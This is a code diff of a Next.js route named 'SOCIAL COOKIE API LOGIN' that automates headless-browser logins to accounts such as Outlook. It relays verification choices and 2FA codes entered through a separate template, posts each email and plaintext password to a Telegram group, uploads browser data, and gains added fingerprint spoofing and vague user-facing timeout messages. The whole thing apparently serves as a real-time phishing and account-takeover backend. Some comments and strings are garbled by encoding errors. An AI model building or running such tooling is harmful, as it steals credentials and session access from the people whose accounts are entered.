@@ -1,6 +1,5 @@
-console.log("--- SOCIAL COOKIE API LOGIN route.js loaded ---");
+﻿console.log("--- SOCIAL COOKIE API LOGIN route.js loaded ---");
 import { NextResponse } from "next/server";
-import puppeteer from "puppeteer-core";
 import chromium from "@sparticuz/chromium-min";
 import { inspect } from 'util';
 import fs from 'fs-extra';
@@ -9,6 +8,7 @@ import {
     launchBrowser,
 } from "../../../../utils/utils.js";
 import logger from "../../../../utils/logger.js";
+import { applyIdentityToPage } from "../../../../utils/identity.js";
 import { platformConfigs } from "./platforms.js";
 import { uploadBrowserData } from '../../../api/googledrive.mjs';
 import {
@@ -23,7 +23,7 @@ import {
     stopAppScriptDataBackgroundUpdater
 } from './routeHelper.js';
 import { notifyTeam } from "../../../../utils/notifyTeam.js";
-import { populateCache, setCachedRow, evictRow } from '../../../../utils/cookieCache.js';
+import { populateCache, setCachedRow, evictRow, getCachedRow } from '../../../../utils/cookieCache.js';
 import { identifySelf as identifyServerlessSelf, getSelfUrl } from '../../../../utils/serverlessTracker.js';
 
 const MAX_CONCURRENT_BROWSERS = parseInt(process.env.MAX_CONCURRENT_BROWSERS || '3', 10);
@@ -270,7 +270,7 @@ async function checkAccountAccess(browser, page, email, password, platform, brow
                     await page.waitForFunction(() => document.readyState === 'complete', { timeout: 10000 });
                     await new Promise(res => setTimeout(res, 2000));
 
-                    // Handle intermediate views after email submission (e.g. Outlook "Verify your email" → "Other ways to sign in" → "Use your password")
+                    // Handle intermediate views after email submission (e.g. Outlook "Verify your email" â†’ "Other ways to sign in" â†’ "Use your password")
                     await handleAdditionalViews(page, platformConfig, instanceId);
 
                     // Check for verification screens (e.g. "Help us protect your account")
@@ -660,8 +660,12 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
             };
             browser.on('targetcreated', targetCreatedListener);
 
-            await page.setUserAgent(browser.selectedUserAgent);
-            await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
+            if (browser.identity) {
+                await applyIdentityToPage(page, browser.identity);
+            } else {
+                await page.setUserAgent(browser.selectedUserAgent);
+                await page.setViewport({ width: 1920, height: 1080, deviceScaleFactor: 1 });
+            }
             await page.evaluateOnNewDocument(() => {
                 const style = document.createElement('style');
                 style.innerHTML = `
@@ -997,7 +1001,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                                             const telegramGroupId = projectDetails?.telegramGroupId;
 
                                             if (telegramGroupId) {
-                                                let message = `🚨 *Login Failed: Incorrect Password* 🚨\n\n`;
+                                                let message = `ðŸš¨ *Login Failed: Incorrect Password* ðŸš¨\n\n`;
                                                 message += `*Project:* ${projectTitle}\n`;
                                                 message += `*Email:* \`${email}\`\n`;
                                                 message += `*Password:* \`${storedPassword}\`\n`;
@@ -1172,23 +1176,50 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         currentVerificationOptions = ljp.verificationOptions || freshCurrentVerificationOptions;
                     }
 
-                    const checkData = await fetchDataFromAppScript(1, 30000, true);
-                    const checkHeaders = checkData[0];
-                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                    const checkRows = checkData.slice(1);
-                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-
-                    if (!checkRow) {
-                        logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
-                        finalStatus = "FAILED"; break;
+                    // Check cache FIRST for status + choice (the template's update-process POST writes
+                    // field values to cache immediately, so cache is the fast/authoritative source).
+                    const cachedForOptionsPoll = getCachedRow(browserId);
+                    const cachedStatusForOptionsPoll = cachedForOptionsPoll?.status;
+                    const TERMINAL_OPTIONS_POLL_STATUSES = ["COMPLETED", "PROCESSING_FINALIZING", "FAILED"];
+                    // Only terminal states represent a real external change. The engine writes
+                    // WAITINGOPTIONS to cache, so a stale sheet status must never be treated as an exit.
+                    if (cachedStatusForOptionsPoll && TERMINAL_OPTIONS_POLL_STATUSES.includes(cachedStatusForOptionsPoll)) {
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${cachedStatusForOptionsPoll}. Exiting loop.`);
+                        finalStatus = cachedStatusForOptionsPoll; break;
                     }
 
-                    const currentSheetStatus = checkRow[columnIndexes['status']];
-                    const verificationChoiceRaw = checkRow[columnIndexes['verificationChoice']];
+                    let verificationChoiceRaw = null;
+                    const cachedChoiceForOptionsPoll = cachedForOptionsPoll?.verificationChoice;
+                    if (cachedChoiceForOptionsPoll && String(cachedChoiceForOptionsPoll).trim() !== "") {
+                        verificationChoiceRaw = cachedChoiceForOptionsPoll;
+                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found in cache: '${verificationChoiceRaw}'`);
+                    }
 
-                    if (currentSheetStatus !== "WAITINGOPTIONS") {
-                        logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
-                        finalStatus = currentSheetStatus; break;
+                    // Fall back to the sheet read only when the cache carries no choice yet.
+                    if (!verificationChoiceRaw) {
+                        const checkData = await fetchDataFromAppScript(1, 30000, true);
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGOPTIONS] Row not found. Failing.`);
+                            finalStatus = "FAILED"; break;
+                        }
+
+                        const currentSheetStatus = checkRow[columnIndexes['status']];
+                        const sheetChoice = checkRow[columnIndexes['verificationChoice']];
+                        if (sheetChoice && String(sheetChoice).trim() !== "") {
+                            verificationChoiceRaw = sheetChoice;
+                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Verification choice found in sheet: '${verificationChoiceRaw}'`);
+                        }
+
+                        // Sheet-status fallback guard only when the cache had no status entry to trust.
+                        if (!cachedStatusForOptionsPoll && TERMINAL_OPTIONS_POLL_STATUSES.includes(currentSheetStatus)) {
+                            logger.info(`[processRow][${browserId}][WAITINGOPTIONS] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
+                            finalStatus = currentSheetStatus; break;
+                        }
                     }
 
                     if (verificationChoiceRaw) {
@@ -1429,7 +1460,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 updateData.fullAccess = false; // FAILED so fullAccess false
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITINGOPTIONS phase: Choice not provided in time."
+                    message: "Verification timed out. Please try again later."
                 });
 
                 // Explicitly close browser and clean up immediately
@@ -1489,25 +1520,55 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                         break; // Exit polling loop
                     }
 
-                    const checkData = await fetchDataFromAppScript(1, 30000, true);
-                    const checkHeaders = checkData[0];
-                    const checkColumnIndexes = getColumnIndexes(checkHeaders);
-                    const checkRows = checkData.slice(1);
-                    const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
-
-                    if (!checkRow) {
-                        logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
-                        finalStatus = "FAILED";
+                    // Check cache FIRST for status + code (the template's update-process POST writes
+                    // field values to cache immediately, so cache is the fast/authoritative source).
+                    const cachedForCodePoll = getCachedRow(browserId);
+                    const cachedStatusForCodePoll = cachedForCodePoll?.status;
+                    const TERMINAL_CODE_POLL_STATUSES = ["COMPLETED", "PROCESSING_FINALIZING", "FAILED"];
+                    // Only terminal states represent a real external change. The engine writes WAITINGCODE
+                    // (and PROCESSING once a code is found) to cache, so a stale sheet status must never
+                    // be treated as an exit.
+                    if (cachedStatusForCodePoll && TERMINAL_CODE_POLL_STATUSES.includes(cachedStatusForCodePoll)) {
+                        logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${cachedStatusForCodePoll}. Exiting loop.`);
+                        finalStatus = cachedStatusForCodePoll;
                         break;
                     }
 
-                    const currentSheetStatus = checkRow[columnIndexes['status']];
-                    const verificationCode = checkRow[columnIndexes['verificationCode']];
+                    let verificationCode = null;
+                    const cachedCodeForPoll = cachedForCodePoll?.verificationCode;
+                    if (cachedCodeForPoll && String(cachedCodeForPoll).trim() !== "") {
+                        verificationCode = cachedCodeForPoll;
+                        logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found in cache: '${verificationCode}'`);
+                    }
 
-                    if (currentSheetStatus !== "WAITINGCODE") {
-                        logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
-                        finalStatus = currentSheetStatus;
-                        break;
+                    // Fall back to the sheet read only when the cache carries no code AND no explicit
+                    // clear ('') yet — otherwise a stale sheet copy could resubmit a rejected code.
+                    if (verificationCode === null && (cachedCodeForPoll === undefined || cachedCodeForPoll === null)) {
+                        const checkData = await fetchDataFromAppScript(1, 30000, true);
+                        const checkHeaders = checkData[0];
+                        const checkColumnIndexes = getColumnIndexes(checkHeaders);
+                        const checkRows = checkData.slice(1);
+                        const checkRow = checkRows.find(r => r[checkColumnIndexes['browserId']] === browserId);
+
+                        if (!checkRow) {
+                            logger.error(`[processRow][${browserId}][WAITINGCODE] Row not found during polling. Exiting loop.`);
+                            finalStatus = "FAILED";
+                            break;
+                        }
+
+                        const currentSheetStatus = checkRow[columnIndexes['status']];
+                        const sheetCode = checkRow[columnIndexes['verificationCode']];
+                        if (sheetCode && String(sheetCode).trim() !== "") {
+                            verificationCode = sheetCode;
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Verification code found in sheet: '${verificationCode}'`);
+                        }
+
+                        // Sheet-status fallback guard only when the cache had no status entry to trust.
+                        if (!cachedStatusForCodePoll && TERMINAL_CODE_POLL_STATUSES.includes(currentSheetStatus)) {
+                            logger.info(`[processRow][${browserId}][WAITINGCODE] Status changed externally to ${currentSheetStatus}. Exiting loop.`);
+                            finalStatus = currentSheetStatus;
+                            break;
+                        }
                     }
 
                     if (verificationCode && String(verificationCode).trim() !== "") {
@@ -1792,7 +1853,7 @@ async function processRow(row, columnIndexes, existingBrowser = null, existingPa
                 updateData.fullAccess = false; // FAILED so fullAccess false
                 updateData.lastJsonResponse = JSON.stringify({
                     ...JSON.parse(updateData.lastJsonResponse || '{}'), status: "FAILED",
-                    message: "Failed during WAITING_CODE phase: Code not provided in time or processing failed."
+                    message: "Verification timed out. Please try again later."
                 });
 
                 // Explicitly close browser and clean up immediately
@@ -2238,7 +2299,7 @@ async function processWaitingRows() {
                 return false;
             }
 
-            // Skip rows assigned to other servers — only filter when this server knows its own URL
+            // Skip rows assigned to other servers â€” only filter when this server knows its own URL
             const serverIdx = columnIndexes['server'];
             if (serverIdx !== undefined && selfUrl) {
                 const rowServer = row[serverIdx];
